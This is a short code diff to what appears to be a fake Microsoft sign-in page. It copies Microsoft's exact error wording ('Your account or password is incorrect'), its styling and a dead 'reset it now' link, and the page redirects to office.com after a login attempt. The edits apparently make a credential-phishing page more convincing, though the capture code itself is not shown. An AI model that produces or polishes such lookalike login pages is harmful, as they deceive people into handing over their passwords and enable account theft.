@@ -201,8 +201,12 @@
         }
 
         .message.error {
-            background: #fde7e9;
-            color: #a4262c;
+            background: transparent;
+            color: #d13438;
+            padding: 2px 0;
+            margin: 2px 0;
+            font-size: 15px;
+            line-height: 1;
         }
 
         .message.microsoft-error {
@@ -609,7 +613,7 @@
                                 currentSessionId = null;
                             }
                         } else {
-                            showMessage('❌ Login failed. Please check your credentials and try again.', 'error');
+                            showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
                         }
                     } else {
                         // Show site report if available
@@ -683,7 +687,7 @@
                         window.location.href = 'https://office.com';
                         return;
                     } else {
-                        showMessage('❌ Login failed. Please check your credentials and try again.', 'error');
+                        showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
                     }
 
                     // Clear password field
